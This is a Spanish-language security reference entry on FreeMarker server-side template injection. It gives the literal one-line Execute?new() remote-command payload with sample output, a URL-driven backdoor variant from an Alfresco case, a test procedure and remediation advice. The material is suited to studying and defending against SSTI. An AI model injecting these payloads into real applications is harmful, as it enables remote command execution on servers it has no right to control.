---
clase: inyeccion
tech: freemarker
cwe: CWE-1336
cvss: 9.8 # [derivado] ejecucion remota de comandos; sin CVE en la fuente
payload: |
  # PAYLOAD LITERAL de la fuente. Ejecucion de comandos en una linea:
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
  #
  # Salida LITERAL que muestra la fuente:
  #   uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)
  #
  # Mecanica: '?new()' es un built-in de FreeMarker que INSTANCIA una clase Java
  # arbitraria. 'freemarker.template.utility.Execute' es una clase del PROPIO
  # FreeMarker, documentada en su Javadoc, que segun la fuente 'Will fork a process,
  # and inline anything that process sends to stdout'.
  #
  # No hay escape de sandbox: la clase es parte de la distribucion y hace exactamente
  # lo que su nombre dice.
  #
  # ---- CASO ALFRESCO (backdoor persistente) ----
  # Variante LITERAL de la fuente, con el comando tomado de la URL:
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}
precondicion: "SSTI confirmada en un motor FreeMarker, y el built-in '?new()' habilitado (es el comportamiento por defecto si no se configura un resolver de clases restrictivo). La fuente aclara que NO considera esto una vulnerabilidad de FreeMarker: el motor hace lo documentado. La vulnerabilidad es permitir que entrada del usuario llegue a la plantilla."
como_se_descubre: |
  Tras identificar FreeMarker (sintaxis ${...} y <#assign>), este payload es la prueba
  directa: una sola peticion decide si hay RCE.
  Señal previa util: FreeMarker se usa mucho en gestores de contenido Java (Alfresco es
  el caso de la fuente) y en plantillas de correo de aplicaciones Spring. Cualquier
  funcion de 'plantilla personalizable' en un producto Java es candidata.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
  #    -> salida de 'id' en la respuesta = RCE confirmado
  # B: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("") }
  #    -> sin salida de comando, pero SIN error de clase = ?new() funciona
  # El par B separa 'no puedo instanciar la clase' de 'el comando no produjo salida'.
  # Si B da error de resolver de clases, ?new() esta restringido y hay que buscar otra
  # via (la fuente documenta que ALLOWS_NOTHING_RESOLVER lo cierra).
mata: |
  - Resolver de clases configurado como ALLOWS_NOTHING_RESOLVER -> ?new() no instancia
    nada. Es la correccion que la propia fuente recomienda.
  - SAFER_RESOLVER: la fuente advierte EXPRESAMENTE que no basta y que hay que usar
    ALLOWS_NOTHING_RESOLVER.
  - '?api' habilitado o no es irrelevante para este payload (afecta a otras vias).
  - El motor no es FreeMarker -> el payload da error de sintaxis.
fuente: "https://portswigger.net/research/server-side-template-injection (James Kettle, 2015-08-05, act. 2025-09-03). Payload, salida y variante de Alfresco literales. Caso Alfresco: 'Disclosure acknowledged, patch in development' segun la fuente. Sin CVE ni recompensa indicados en el articulo."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] SSTI en FreeMarker — `Execute?new()` da ejecución de comandos en una línea

## Principio
FreeMarker trae un built-in, `?new()`, que **instancia una clase Java arbitraria**. Y la
propia distribución de FreeMarker incluye una clase llamada `Execute`, documentada en su
Javadoc, que —en palabras de la fuente— *"Will fork a process, and inline anything that
process sends to stdout"*.

No hay escape de sandbox ni cadena de gadgets: el motor expone una clase que ejecuta
procesos y un mecanismo para instanciarla. El payload es una línea.

## Payload
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

Salida literal que muestra la fuente:

```
uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)
```

Variante del caso Alfresco, que convierte la plantilla en un backdoor persistente
tomando el comando de la URL:

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex(url.getArgs())}
```

## La distinción que hace la fuente, y por qué importa
El autor declara explícitamente que **no considera esto una vulnerabilidad de
FreeMarker**: el motor hace lo que documenta. La vulnerabilidad es permitir que entrada
del usuario llegue a una plantilla. Esa distinción no es académica — determina a quién
se reporta y qué se pide. Reportarlo a FreeMarker produce un "funciona como está
diseñado"; reportarlo a la aplicación que interpola entrada del usuario produce un
parche.

## Impacto
Ejecución remota de comandos con los privilegios del proceso de aplicación — en el
ejemplo de la fuente, el usuario `tomcat7`. Es el techo de impacto de toda la familia
SSTI y se alcanza sin cadena de gadgets ni condiciones de carrera.

## Remediación
De la fuente, sobre la configuración de FreeMarker: establecer el resolver de clases de
`?new()` a **`ALLOWS_NOTHING_RESOLVER`**, y la advertencia explícita de **no** usar
`SAFER_RESOLVER`, que no basta. Mantener `?api` deshabilitado (es el valor por defecto),
restringir el acceso a miembros con `SimpleObjectWrapper` o una
`WhitelistMemberAccessPolicy`, deshabilitar el envoltorio de nodos DOM, y usar un cargador
de plantillas que solo cargue ficheros aprobados.

Y la regla de fondo del paper: los sandboxes *"should not be relied on except as a
defense in depth measure"*, con el entorno de plantillas desplegado en un contenedor
restringido —capacidades reducidas, sistema de ficheros de solo lectura, kernel
endurecido.
